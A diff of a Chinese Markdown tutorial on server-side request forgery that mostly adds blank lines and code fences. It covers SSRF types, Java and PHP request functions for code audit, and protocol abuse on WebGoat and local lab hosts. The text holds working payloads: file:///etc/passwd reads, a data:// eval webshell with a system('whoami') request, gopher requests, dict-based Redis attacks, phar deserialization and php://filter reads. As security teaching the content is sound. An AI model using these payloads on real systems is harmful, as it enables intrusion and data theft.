@@ -22,6 +22,7 @@ try (InputStream in = new URL(url).openStream()) {
 }
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_29_yoFYD1dR.png)
+
 分析代码，对输入的URL进行了matches匹配，只允许访问`http://ifconfig.pro`，为了查看回显SSRF效果，将代码中的字符串匹配逻辑修改如下
 
 ```java
@@ -36,20 +37,33 @@ try (InputStream in = new URL(url).openStream()) {
  }
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_30_A0n5s6UO.png)
+
 在这里测试，在url中输入`http://www.baidu.com`，就会把请求内容返回回来，这种就叫做有回显的ssrf提交的URL参数在服务器上使用java.net.URL类去发起请求，然后打开URL保存二进制流`InputStream in = new URL(url).openStream()`，最后将结果处理后返回给前端。
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_30_FIx3pm7P.png)
 
 ### 侧信息的SSRF（返回状态码，时间延时等）
 这种类型因为在后端进行了相应处理，无法获得完整的响应源码，只能通过后端返回状态码，请求响应延时等来判断SSRF情况。像上面的demo可以修改一下模拟这个场景，成功请求返回1,失败返回0
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_31_E8gpakU3.png)
+
 当请求一个不存在的域名导致失败，输出位置返回0：
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_31_rxZHscQI.png)
+
 这就是根据回显信息的不同表现来判断是否成功发起了请求，在SSRF中可以对自身web服务进行请求再和不存在的地址请求，可以观察到不同的响应参数值、响应延时等说明极有可能存在SSRF。
+
 ### Bind SSRF（完全没有回显或其他侧信息）
 这一类的SSRF就完全没有回显和侧信息来泄露利用结果，服务器的返回始终一致，一般的可以通过OOB数据带外来观察是否存在漏洞，如下使用端口监听方法，vps上开启端口监听，在可能存在漏洞的位置写入vps的监听地址
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_31_t6U9Nk5m.png)
+
 使用dnslog平台判断
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_32_3jeEaAsV.png)
+
+
+
 ## SSRF漏洞挖掘
 ### 常见漏洞场景
 
@@ -100,10 +114,13 @@ try (InputStream in = new URL(url).openStream()) {
 ### JAVA中的SSRF
 产生SSRF的原因都是在代码层面没有对传入的地址进行严格限制。在JAVA代码审计中，不仅要关注可能对外发起请求的类调用，也要关注一些限制措施是否存在绕过的可能，在手工审计过程中通过功能点审计一些常见的外部请求类和第三方包的使用代码，进而分析是否存在漏洞，总结一些可能存在SSRF漏洞的代码，审计时可以查找类的调用代码，观察输入是否可控、代码过滤是否可以绕过。
 在webgoat中，SSRF的两个task都是做过限制，比如如下，如果url不能完全匹配`http://ifconfig.pro`，则无法进入代码层
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_32_6iFtGIaL.png)
+
 #### JAVA 的网络请求类
 **java.net.URL**
 webgoat靶场SSRF中的代码，使用URL类中openStream()打开远程链接的数据流：
+
 ```java
 import java.net.URL;
 try {
@@ -149,6 +166,7 @@ HttpPost httpPost = new HttpPost
 ```
 **okhttp**
 OkHttp是一个 Java 的 HTTP+SPDY 客户端开发包，同时也支持 Android，由Square 公司开源贡献，项目官博：https://square.github.io/okhttp/。示例代码：
+
 ```java
 package okhttp3.guide;
 import java.io.IOException;
@@ -174,6 +192,7 @@ public class GetExample {
 ```
 **Retrofit**
 Retrofit 是 Square 公司出品的默认基于 OkHttp 封装的一套 RESTful 网络请求框架，适用于 Android 和 Java 的类型安全HTTP 客户端，示例代码：
+
 ```java
 Retrofit retrofit = new Retrofit.Builder()
     .baseUrl("https://api.github.com/")
@@ -209,7 +228,7 @@ public class BankService {
 ```
 ### PHP 中的SSRF
 #### PHP 的网络请求函数
-在PHP中使用fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()等函数不当可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析：
+在PHP中使用`fsockopen()、pfsockopen()、file_get_contents()、show_source()、highlight_file()、curl_exec()、curl_multi_exec()、fopen()、readfile()、mysqli_connect()、include()、require()、file()、copy()`等函数不当可能导致SSRF漏洞。可以在php.net中搜索网络请求、套接字建立、数据库链接、文件操作相关的函数，部分函数使用的示例代码如下，代码审计时可根据关键字搜索函数进行分析：
 ```php
 <?php
 class SSRF {
@@ -326,6 +345,7 @@ $S->SSRF_require();        //配置php.ini allow_url_include=On,需要文件名�
 经过测试在JDK15中可以支持以下协议使用：http、https、ftp、file、jar、mailto*,openjdk9中移除了协议[netdoc](https://bugs.openjdk.java.net/browse/JDK-8176351),JDK8中移除了gopher协议的支持。以webgoat靶场SSRF为例测试部分协议的使用，使用file协议读取文件/列目录(file:///etc/passwd)：
 #### file协议
 ![image.png](./SSRF.assets/2023_05_19_10_39_32_U6ONqAEg.png)
+
 #### Jar协议
 需要源文件为zip或者jar包，来本地读取文件
 ```shell
@@ -333,12 +353,16 @@ jar:file:///home/luogan/Desktop/test.zip!/ShiroExploit.V2.51/config/keys.conf
 jar:file:///home/luogan/Desktop/ShiroExploit.V2.51/ShiroExploit.jar!/my.css
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_33_PZ0cHFXD.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_33_lU3yk0Xj.png)
-jar协议读取远程文件(jar:http(s)://x.x.x/xx.zip!/file.txt)，同时会下载远程文件保存在本地缓存中：
+
+jar协议读取远程文件(`jar:http(s)://x.x.x/xx.zip!/file.txt`)，同时会下载远程文件保存在本地缓存中：
+
 ```shell
 jar:http://127.0.0.1:8888/ShiroExploit.V2.51/ShiroExploit.jar!/my.css
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_34_kQSuPxf3.png)
+
 #### java.net.HttpURLConnection类转换
 部分类支持的协议会进行限制，使用了HttpURLConnection对openConnection进行类型强制转换后的请求就只支持HTTP(S)：
 ```java
@@ -359,7 +383,11 @@ try{
 }
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_34_ObQWCeVs.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_34_pJeOlPz0.png)
+
+
+
 #### mailto
 mailto协议可以用来发送邮件，该协议的利用需要后端配置了邮件的发送服务器和相关的支持才能正常使用，协议格式如下：
 ```shell
@@ -372,6 +400,8 @@ mailto:name1@rapidtables.com?cc=name2@rapidtables.com&bcc=name3@rapidtables.com
 ```
 ### PHP
 在PHP中支持的协议：
+
+```text
 dict:// — 词典网络协议(curl扩展支持)
 file:// — 访问本地文件系统
 http:// — 访问 HTTP(s) URL
@@ -386,6 +416,8 @@ rar:// — RAR
 ogg:// — 音频流
 expect:// ——流程交互流
 gopher:// —— 信息查找系统协议
+```
+
 #### DATA 协议
 DATA协议配合include(require) Getshell
 ```http
@@ -397,11 +429,18 @@ data://image/jpeg,
 data://text/plain,<?php%20phpinfo();
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_35_d4sbQ3gG.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_35_wlK3CEOz.png)
+
+
+
 ```http
 data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_36_2nhMxevI.png)
+
+
+
 ```http
 POST /index.php?url=data://text/plain,<?php+@eval($_POST['cmd']); HTTP/1.1
 Host: 127.0.0.1
@@ -423,17 +462,29 @@ Content-Length: 21
 cmd=system('whoami');
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_36_w23LTOnA.png)
+
+
+
 #### DICT 协议
 DICT协议是词典网络协议，在RFC 2009中进行描述，使用空格或者:作为分隔参数。在利用dict协议中，一行只能包括一行命令，不能输入多行命令(所以不能攻击认证的redis)：
 下面是具体攻击redis服务，由于Redis在Ubuntu上，写入定时任务会预检，导致无法执行，但是在centos上是没有问题的
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_37_JEUmtA7p.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_37_rqBCT6LK.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_38_2ZEXoIYz.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_38_guGS63m0.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_38_45eTw7y2.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_39_VZKPAhtM.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_39_qc40tQuW.png)
+
 对于<、?、: 等特殊符号需要转为对应的16进制：
+
 ```http
 < => \x3c 
 ? => \x3f 
@@ -443,21 +494,33 @@ DICT协议是词典网络协议，在RFC 2009中进行描述，使用空格或�
 #### Gopher 协议
 该协议在PHP中需要cURL扩展支持，使用curl_exec(),curl_multi_exec()函数发起请求。gopher协议格式为gopher://IP:port/_{TCP/IP数据流}，开始的字符可以随意，数据流使用URL编码，我们发送到的payload需要双编码，因为gopher协议会将url解码一次，再进行传输不认识\r\n或者?就不能成功
 注意，GET 请求不带HTTP协议版本，POST请求一定要带HTTP协议版本
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_40_pkfH0UPn.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_40_ovTkS6fF.png)
+
 将?(%3f)编码成(%25%3f)
+
 ```http
 gopher://192.168.200.38:8888/_%47%45%54%20%2f%74%65%73%74%2e%70%68%70%253f%66%69%6c%65%31%3d%73%68%65%6c%6c%2e%70%68%70%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_41_cGnkaMb9.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_41_oiWXhqEr.png)
+
 POST需要Content-Type,Content-Length,HOST,POST_DATA，请求体整体URL编码
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_42_VKu049DH.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_42_iKgVOqFn.png)
+
+
+
 ```http
 gopher://192.168.200.76:80/_%50%4f%53%54%20%2f%74%65%73%74%31%2e%70%68%70%20%48%54%54%50%20%2f%31%2e%31%250d%250a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%250d%250a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%250d%250a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%38%250d%250a%250d%250a%64%61%74%61%3d%31%32%33
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_43_1E72cCIK.png)
+
 #### PHAR 协议
 PHAR协议用于在PHP中解析phar文件，phar文件的meta-data字段存在反序列化漏洞，可以使用协议读取文件触发反序列化，漏洞代码：
 ```php
@@ -490,7 +553,11 @@ $phar -> setMetadata($object);
 $phar -> stopBuffering();
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_43_TQNc2EyJ.png)
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_43_nUxeYPyj.png)
+
+
+
 #### php://filter
 读取本地文件并进行base64编码
 ```
@@ -498,9 +565,15 @@ php://filter/convert.base64-encode/resource=xx.xx
 php://filter/read=convert.base64-encode/resource=xx.xx
 ```
 ![image.png](./SSRF.assets/2023_05_19_10_39_43_QkzA62v4.png)
+
+
+
 #### php://input
 可以获取请求中的原始流，如读取POST输入流
+
 ![image.png](./SSRF.assets/2023_05_19_10_39_44_IHTvPbEj.png)
+
+
 
 ## 参考链接
 [https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)
